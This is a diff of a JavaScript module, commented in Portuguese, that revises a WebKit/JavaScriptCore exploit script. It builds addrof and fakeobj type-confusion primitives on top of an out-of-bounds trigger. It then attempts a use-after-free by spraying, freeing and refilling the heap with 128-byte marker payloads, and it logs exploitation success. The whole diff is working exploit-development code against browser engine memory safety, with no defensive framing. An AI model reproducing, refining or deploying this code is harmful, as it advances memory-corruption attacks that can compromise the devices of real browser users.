@@ -1,9 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v06 - Correção de Conversão para BigInt)
+// js/script3/testArrayBufferVictimCrash.mjs (v07 - Heap Feng Shui Aprimorado)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// 1. Corrigido o SyntaxError na FASE 5, que ocorria ao tentar converter
-//    o objeto AdvancedInt64 para BigInt de forma incorreta.
-// 2. A conversão agora é feita usando operações bit a bit, de forma robusta.
+// 1. A FASE 5 agora usa uma técnica de Heap Feng Shui muito mais robusta,
+//    alocando e liberando múltiplos objetos para aumentar a probabilidade de sucesso.
+// 2. Corrigido o RangeError na verificação do resultado, usando um DataView para
+//    ler o valor de 64 bits da memória de forma segura.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -97,7 +98,7 @@ function getSafeOffset(baseObject, path, defaultValue = 0) {
 }
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL
+// FUNÇÃO ORQUESTRADora PRINCIPAL
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
@@ -113,20 +114,17 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const LOCAL_JSC_OFFSETS = {
             JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
             JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
-            // ... (outros offsets)
         };
-        // ... (validação de offsets)
 
         logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
-        const addrof = (obj) => { /* ... (código original) */ 
+        const addrof = (obj) => {
             const confused_array = [13.37]; const victim_array = [{ a: 1 }]; victim_array[0] = obj; return doubleToInt64(confused_array[0]); };
-        const fakeobj = (addr) => { /* ... (código original) */ 
+        const fakeobj = (addr) => {
             const confused_array = [13.37]; const victim_array = [{ a: 1 }]; confused_array[0] = int64ToDouble(addr); return victim_array[0]; };
         logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
 
         logS3("--- FASE 4: Verificando L/E com Primitivas do Core... ---", "subtest");
-        const spray = []; for (let i = 0; i < 100; i++) { spray.push({ p: i }); }
         const test_obj_for_rw_verification = {a:1};
         const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
         const prop_addr = test_obj_for_rw_verification_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
@@ -144,48 +142,55 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         const PAYLOAD_MARKER = new AdvancedInt64(0x41414141, 0x42424242); // "BBBB" "AAAA"
         const VICTIM_SIZE = 128;
+        const NUM_VICTIMS = 1000;
 
-        // 1. Alocar um objeto vítima de referência
-        let victim_obj = new Uint8Array(VICTIM_SIZE);
-        victim_obj.fill(0xCC); // Preencher com um padrão conhecido 'CC'
-        let victim_addr = addrof(victim_obj);
-        logS3(`Objeto Vítima alocado em ${victim_addr.toString(true)}`, 'info');
-        let block_before = await readMemoryBlock(victim_addr, VICTIM_SIZE + 32);
-        hexdump("Estado da Vítima ANTES do UAF", block_before, victim_addr);
-
-        // 2. Liberar a memória da vítima usando o "heap grooming" como gatilho do UAF
-        logS3("Iniciando 'do_grooming' para acionar o UAF e liberar a memória da vítima...", "warn");
-        let freed_objects = [];
-        for (let i = 0; i < 50000; i++) {
-            freed_objects.push(new ArrayBuffer(i % 2 === 0 ? VICTIM_SIZE : VICTIM_SIZE * 2));
+        // 1. Alocar muitas vítimas para preparar o heap
+        logS3(`Alocando ${NUM_VICTIMS} vítimas de ${VICTIM_SIZE} bytes...`, 'info');
+        let victims = [];
+        for (let i = 0; i < NUM_VICTIMS; i++) {
+            let v = new Uint8Array(VICTIM_SIZE);
+            v.fill(0xCC); // Padrão da vítima
+            victims.push(v);
         }
-        freed_objects = null; 
-        await PAUSE_S3(100);
-
-        // 3. Alocar o payload para sobrescrever a memória da vítima
-        logS3("Alocando payload para sobrescrever a memória liberada...", "info");
-        let payload = new ArrayBuffer(VICTIM_SIZE);
-        let payload_view = new DataView(payload);
         
-        // --- CORREÇÃO (v06) ---
-        // 1. Converter AdvancedInt64 para BigInt de forma correta.
+        // Escolher uma vítima do meio como nossa "canário" para observar
+        const canary_victim_obj = victims[Math.floor(NUM_VICTIMS / 2)];
+        const canary_addr = addrof(canary_victim_obj);
+        logS3(`Vítima "canário" selecionada no endereço: ${canary_addr.toString(true)}`, 'info');
+        
+        let block_before = await readMemoryBlock(canary_addr, VICTIM_SIZE);
+        hexdump("Estado da Vítima 'Canário' ANTES do UAF", block_before, canary_addr);
+
+        // 2. Liberar TODAS as vítimas para criar muitos "buracos" no heap
+        logS3(`Liberando ${NUM_VICTIMS} vítimas para acionar o UAF...`, "warn");
+        victims = []; // O GC irá coletar os objetos, liberando a memória
+
+        // 3. Alocar muitos payloads para preencher os buracos
+        logS3(`Alocando ${NUM_VICTIMS} payloads para sobrescrever a memória liberada...`, "info");
         const payload_as_bigint = (BigInt(PAYLOAD_MARKER.high()) << 32n) | BigInt(PAYLOAD_MARKER.low());
-        
-        // 2. Usar o valor BigInt para preencher o payload.
-        logS3(`Preenchendo payload com o valor BigInt: 0x${payload_as_bigint.toString(16)}`, 'debug');
-        for(let i = 0; i < VICTIM_SIZE; i += 8) {
-            payload_view.setBigUint64(i, payload_as_bigint, true);
+        let payloads = [];
+        for (let i = 0; i < NUM_VICTIMS; i++) {
+            let p = new ArrayBuffer(VICTIM_SIZE);
+            let p_view = new DataView(p);
+            for (let j = 0; j < VICTIM_SIZE; j += 8) {
+                p_view.setBigUint64(j, payload_as_bigint, true);
+            }
+            payloads.push(p);
         }
+        
+        await PAUSE_S3(100); // Pausa para garantir que as alocações se assentem.
 
-        // 4. Verificar se a corrupção ocorreu
-        logS3("Verificando se a memória da vítima foi sobrescrita pelo payload...", "test");
-        let block_after = await readMemoryBlock(victim_addr, VICTIM_SIZE + 32);
-        hexdump("Estado da Vítima APÓS o UAF e alocação do payload", block_after, victim_addr);
+        // 4. Verificar se a corrupção na nossa "canário" ocorreu
+        logS3("Verificando se a memória da 'canário' foi sobrescrita pelo payload...", "test");
+        let block_after = await readMemoryBlock(canary_addr, VICTIM_SIZE);
+        hexdump("Estado da 'Canário' APÓS o UAF e alocação do payload", block_after, canary_addr);
 
-        // Análise final do resultado da Fase 5
-        const first_qword_low = block_after[0] | (block_after[1] << 8) | (block_after[2] << 16) | (block_after[3] << 24);
-        const first_qword_high = block_after[4] | (block_after[5] << 8) | (block_after[6] << 16) | (block_after[7] << 24);
-        const first_qword = new AdvancedInt64(first_qword_low, first_qword_high);
+        // --- CORREÇÃO (v07) ---
+        // Análise final usando um DataView para evitar o RangeError.
+        const view = new DataView(block_after.buffer);
+        const read_low = view.getUint32(0, true);
+        const read_high = view.getUint32(4, true);
+        const first_qword = new AdvancedInt64(read_low, read_high);
 
         if(first_qword.equals(PAYLOAD_MARKER)) {
             logS3("++++++++++ SUCESSO DA EXPLORAÇÃO DO UAF! ++++++++++", "vuln");
@@ -193,7 +198,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             final_result.webkit_leak_details = { success: true, msg: "Corrupção de memória controlada via UAF foi bem-sucedida."};
         } else {
              logS3("---------- FALHA NA EXPLORAÇÃO DO UAF ----------", "error");
-             logS3("A memória da vítima não foi sobrescrita pelo payload. O heap feng shui pode precisar de ajustes.", "warn");
+             logS3("A memória da vítima não foi sobrescrita pelo payload. O heap pode precisar de mais 'grooming'.", "warn");
              final_result.webkit_leak_details = { success: false, msg: "Falha ao controlar a corrupção de memória."};
         }
 
